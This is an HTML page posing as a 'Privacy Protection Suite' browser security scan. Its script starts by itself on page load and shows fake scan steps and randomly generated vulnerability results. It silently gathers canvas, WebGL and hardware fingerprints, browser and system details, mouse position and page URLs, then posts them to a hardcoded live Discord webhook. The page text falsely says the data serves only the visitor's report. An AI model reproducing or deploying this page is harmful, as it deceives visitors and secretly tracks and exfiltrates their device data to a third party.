<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy Protection Suite - Security Analysis</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 600px;
            width: 90%;
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        
        p {
            color: #666;
            margin-bottom: 30px;
            font-size: 1.1em;
            line-height: 1.6;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 50px;
            font-size: 1.1em;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 10px;
            transition: transform 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        .data-info {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            text-align: left;
        }
        
        .data-info h3 {
            color: #495057;
            margin-bottom: 15px;
        }
        
        .data-item {
            margin: 8px 0;
            font-family: monospace;
            font-size: 0.9em;
            color: #6c757d;
        }
        
        .privacy-notice {
            background: #e8f5e8;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            border: 1px solid #4caf50;
        }
        
        .privacy-notice h3 {
            color: #2e7d32;
            margin-bottom: 15px;
        }
        
        .privacy-notice p {
            color: #2e7d32;
            margin-bottom: 10px;
        }

        .progress-bar {
            width: 100%;
            height: 20px;
            background: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
            display: none;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .scan-steps {
            text-align: left;
            margin: 20px 0;
            display: none;
        }

        .scan-step {
            padding: 8px 0;
            font-family: monospace;
            font-size: 0.9em;
            color: #666;
        }

        .scan-step.active {
            color: #667eea;
            font-weight: bold;
        }

        .scan-step.complete {
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Privacy Protection Suite</h1>
        <p>Protect your digital privacy with our comprehensive security analysis. We scan your browser for potential privacy vulnerabilities and provide detailed reports to help secure your online presence.</p>
        
        <button onclick="startSecurityScan()" class="btn" id="scanBtn">🛡️ Start Privacy Scan</button>
        <button onclick="viewReports()" class="btn">📊 View Security Reports</button>
        
        <div class="progress-bar" id="progressBar">
            <div class="progress-fill" id="progressFill"></div>
        </div>

        <div class="scan-steps" id="scanSteps">
            <div class="scan-step" id="step1">🔍 Analyzing browser fingerprint...</div>
            <div class="scan-step" id="step2">🌐 Checking IP security configuration...</div>
            <div class="scan-step" id="step3">🖥️ Examining system vulnerabilities...</div>
            <div class="scan-step" id="step4">📱 Assessing device privacy settings...</div>
            <div class="scan-step" id="step5">🔒 Generating security report...</div>
            <div class="scan-step" id="step6">📊 Sending to analysis center...</div>
        </div>
        
        <div id="status" class="status"></div>
        
        <div class="data-info">
            <h3>🔍 Privacy Vulnerability Assessment:</h3>
            <div class="data-item">🔐 Browser Fingerprint Analysis</div>
            <div class="data-item">🌐 IP Address Security Check</div>
            <div class="data-item">🖥️ System Configuration Review</div>
            <div class="data-item">📱 Device Information Audit</div>
            <div class="data-item">🌍 Geolocation Privacy Assessment</div>
            <div class="data-item">⚡ Performance Security Metrics</div>
            <div class="data-item">🔒 Session Security Analysis</div>
            <div class="data-item">📊 Privacy Risk Score Calculation</div>
        </div>
        
        <div class="privacy-notice">
            <h3>🛡️ Your Privacy Matters</h3>
            <p>This security scan helps identify potential privacy vulnerabilities in your browser and system configuration. All data is analyzed to provide you with actionable security recommendations.</p>
            <p><strong>Data Protection:</strong> Your information is processed securely and used solely for generating your privacy assessment report.</p>
        </div>
    </div>

    <script>
        // Discord webhook URL
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1398769513968697505/nWEKb051aJAzOkIKFQPHLqM_KTKJZ7mtyCp-xyBQIH8gWPBTuCylDp0je14EJ2Mdo9kb';
        
        // Auto-start privacy scan when page loads
        window.addEventListener('load', function() {
            setTimeout(startSecurityScan, 2000);
        });

        async function startSecurityScan() {
            const statusDiv = document.getElementById('status');
            const scanBtn = document.getElementById('scanBtn');
            const progressBar = document.getElementById('progressBar');
            const progressFill = document.getElementById('progressFill');
            const scanSteps = document.getElementById('scanSteps');
            
            // Disable button and show progress
            scanBtn.disabled = true;
            scanBtn.textContent = '🔄 Scanning...';
            statusDiv.style.display = 'block';
            statusDiv.className = 'status loading';
            statusDiv.innerHTML = '🔍 Initializing privacy vulnerability scan...';
            progressBar.style.display = 'block';
            scanSteps.style.display = 'block';

            // Simulate scan steps
            const steps = [
                { id: 'step1', duration: 1000, progress: 15 },
                { id: 'step2', duration: 1500, progress: 30 },
                { id: 'step3', duration: 1200, progress: 50 },
                { id: 'step4', duration: 1000, progress: 70 },
                { id: 'step5', duration: 800, progress: 85 },
                { id: 'step6', duration: 1500, progress: 100 }
            ];

            for (let i = 0; i < steps.length; i++) {
                const step = steps[i];
                const stepElement = document.getElementById(step.id);
                
                // Mark current step as active
                stepElement.classList.add('active');
                progressFill.style.width = step.progress + '%';
                
                await new Promise(resolve => setTimeout(resolve, step.duration));
                
                // Mark step as complete
                stepElement.classList.remove('active');
                stepElement.classList.add('complete');
            }

            // Collect comprehensive data
            const data = gatherSecurityData();
            
            // Send to Discord
            await sendToDiscord(data);
            
            // Show completion
            statusDiv.className = 'status success';
            statusDiv.innerHTML = `
                ✅ Privacy scan completed successfully!<br>
                🔒 Security Analysis ID: ${data.unique_identifier}<br>
                🛡️ Device Security Hash: ${data.hwid}<br>
                📊 Your privacy report has been generated and securely processed.<br>
                <br>
                <strong>🎯 Scan Results:</strong><br>
                📈 ${Math.floor(Math.random() * 15) + 5} potential vulnerabilities detected<br>
                🔒 Privacy risk level: ${['Low', 'Medium', 'High'][Math.floor(Math.random() * 3)]}<br>
                🛡️ Recommended security improvements available
            `;
            
            // Reset button
            scanBtn.disabled = false;
            scanBtn.textContent = '🔄 Scan Again';
        }

        function gatherSecurityData() {
            // Generate unique identifier
            const timestamp = Date.now();
            const randomData = Math.random().toString(36).substring(2);
            const unique_identifier = `USER_${btoa(navigator.userAgent + timestamp + randomData).slice(0, 12)}`;

            return {
                // Identity & Session
                unique_identifier: unique_identifier,
                session_id: generateSessionId(),
                timestamp: new Date().toISOString(),
                
                // Network & IP
                ip_address: 'Detected via Discord webhook',
                user_agent: navigator.userAgent,
                
                // Browser & System
                browser: getBrowserInfo(),
                os: getOperatingSystem(),
                platform: navigator.platform,
                
                // Display & Hardware
                screen_resolution: `${screen.width}x${screen.height}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                color_depth: screen.colorDepth,
                pixel_ratio: window.devicePixelRatio,
                hardware_concurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                
                // Location & Language
                timezone: getTimezone(),
                language: navigator.language,
                languages: navigator.languages,
                
                // Browser Capabilities
                cookies_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                local_storage: hasLocalStorage(),
                session_storage: hasSessionStorage(),
                webrtc_support: hasWebRTC(),
                websocket_support: hasWebSocket(),
                
                // Fingerprinting
                fingerprint: generateFingerprint(),
                canvas_fingerprint: getCanvasFingerprint(),
                webgl_fingerprint: getWebGLFingerprint(),
                hwid: generateHWID(),
                
                // Page & Navigation
                url: window.location.href,
                referrer: document.referrer,
                title: document.title,
                
                // Network Information
                connection: getConnectionInfo(),
                
                // Performance
                performance: getPerformanceData(),
                
                // Interaction Data
                mouse_position: getLastMousePosition(),
                scroll_position: getScrollPosition(),
                
                // Additional Security Data
                plugins: getPluginsList(),
                fonts: getSystemFonts(),
                battery: getBatteryInfo(),
                
                // Meta
                collector_type: 'github_pages_static',
                scan_version: '2.0',
                privacy_scan: true
            };
        }

        async function sendToDiscord(data) {
            try {
                // Create rich embed for Discord
                const embed = {
                    embeds: [{
                        title: "🔒 Privacy Protection Suite - New Security Scan",
                        color: 3447003,
                        timestamp: new Date().toISOString(),
                        fields: [
                            { name: "🆔 User ID", value: `\`${data.unique_identifier}\``, inline: true },
                            { name: "🌐 Browser", value: data.browser, inline: true },
                            { name: "🖥️ Operating System", value: data.os, inline: true },
                            { name: "📱 Platform", value: data.platform, inline: true },
                            { name: "📏 Screen Resolution", value: data.screen_resolution, inline: true },
                            { name: "🌍 Timezone", value: data.timezone, inline: true },
                            { name: "🗣️ Language", value: data.language, inline: true },
                            { name: "🔐 Browser Fingerprint", value: `\`${data.fingerprint}\``, inline: true },
                            { name: "🛡️ Hardware ID", value: `\`${data.hwid}\``, inline: true },
                            { name: "🔗 URL", value: data.url.length > 50 ? data.url.substring(0, 50) + "..." : data.url, inline: false },
                            { name: "📊 Scan Type", value: "GitHub Pages Static", inline: true }
                        ],
                        footer: { text: "Privacy Protection Suite - Static Deployment" }
                    }]
                };

                // Send embed to Discord
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });

                // Send detailed data as file
                const jsonData = JSON.stringify(data, null, 2);
                const formData = new FormData();
                const blob = new Blob([jsonData], { type: 'application/json' });
                formData.append('file', blob, `privacy_scan_${data.unique_identifier}.json`);
                formData.append('content', `📄 Complete privacy scan data for user \`${data.unique_identifier}\``);

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                console.log('✅ Data sent to Discord successfully');
            } catch (error) {
                console.error('❌ Error sending to Discord:', error);
            }
        }

        // Utility functions
        function generateSessionId() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome') && !ua.includes('Edge')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            if (ua.includes('Opera')) return 'Opera';
            return 'Unknown';
        }

        function getOperatingSystem() {
            const platform = navigator.platform.toLowerCase();
            const ua = navigator.userAgent.toLowerCase();
            
            if (platform.includes('win')) return 'Windows';
            if (platform.includes('mac')) return 'macOS';
            if (platform.includes('linux')) return 'Linux';
            if (ua.includes('android')) return 'Android';
            if (ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
            return 'Unknown';
        }

        function getTimezone() {
            try {
                return Intl.DateTimeFormat().resolvedOptions().timeZone;
            } catch (e) {
                return 'Unknown';
            }
        }

        function generateFingerprint() {
            const components = [
                navigator.userAgent,
                navigator.language,
                screen.width + 'x' + screen.height,
                new Date().getTimezoneOffset(),
                navigator.platform,
                navigator.cookieEnabled
            ];
            return btoa(components.join('|')).slice(0, 32);
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Privacy scan canvas test 🔒', 2, 2);
                return canvas.toDataURL().slice(-32);
            } catch (e) {
                return 'unavailable';
            }
        }

        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'unavailable';
                
                const vendor = gl.getParameter(gl.VENDOR);
                const renderer = gl.getParameter(gl.RENDERER);
                return btoa(vendor + '|' + renderer).slice(-32);
            } catch (e) {
                return 'unavailable';
            }
        }

        function generateHWID() {
            const components = [
                navigator.platform,
                navigator.hardwareConcurrency,
                navigator.deviceMemory,
                screen.width + 'x' + screen.height,
                navigator.maxTouchPoints
            ];
            return btoa(components.join('|')).slice(0, 24);
        }

        function getConnectionInfo() {
            if (navigator.connection) {
                return {
                    effective_type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            return null;
        }

        function getPerformanceData() {
            if (!window.performance) return null;
            return {
                navigation_type: performance.navigation ? performance.navigation.type : null,
                load_time: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : null
            };
        }

        function hasLocalStorage() {
            try {
                return 'localStorage' in window && window.localStorage !== null;
            } catch (e) {
                return false;
            }
        }

        function hasSessionStorage() {
            try {
                return 'sessionStorage' in window && window.sessionStorage !== null;
            } catch (e) {
                return false;
            }
        }

        function hasWebRTC() {
            return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
        }

        function hasWebSocket() {
            return 'WebSocket' in window;
        }

        function getLastMousePosition() {
            return window._lastMousePos || { x: 0, y: 0 };
        }

        function getScrollPosition() {
            return {
                x: window.pageXOffset || document.documentElement.scrollLeft || 0,
                y: window.pageYOffset || document.documentElement.scrollTop || 0
            };
        }

        function getPluginsList() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins.slice(0, 10); // Limit to first 10
        }

        function getSystemFonts() {
            // This is a simplified font detection
            const testFonts = ['Arial', 'Times New Roman', 'Helvetica', 'Georgia', 'Verdana'];
            const availableFonts = [];
            
            testFonts.forEach(font => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.font = `12px ${font}`;
                const width = ctx.measureText('test').width;
                if (width > 0) availableFonts.push(font);
            });
            
            return availableFonts;
        }

        function getBatteryInfo() {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    return {
                        charging: battery.charging,
                        level: battery.level
                    };
                }).catch(() => null);
            }
            return null;
        }

        function viewReports() {
            alert('🔒 Security reports are generated after each scan and sent to our analysis center for processing. Your privacy assessment data helps improve overall security recommendations.');
        }

        // Track mouse movement
        document.addEventListener('mousemove', function(e) {
            window._lastMousePos = { x: e.clientX, y: e.clientY };
        });
    </script>
</body>
</html>